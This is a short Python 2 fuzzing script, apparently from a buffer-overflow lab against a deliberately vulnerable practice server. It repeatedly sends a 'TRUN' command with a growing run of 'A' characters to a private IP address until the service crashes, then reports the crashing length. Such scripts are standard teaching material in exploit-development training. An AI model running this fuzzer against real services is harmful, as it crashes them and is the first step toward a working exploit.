#!/usr/bin/python2
import sys, socket
from time import sleep

buff = "A" * 100

while True:
	try:
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.connect(('172.23.74.125', 9999))

		soc.send(('TRUN /.:/' + buff))
		soc.close()
		sleep(1)
		buff = buff + "A" * 100
	except:
		print "Fuzzing Crashed Vuln Server at %s bytes" % str(len(buff))
		sys.exit()
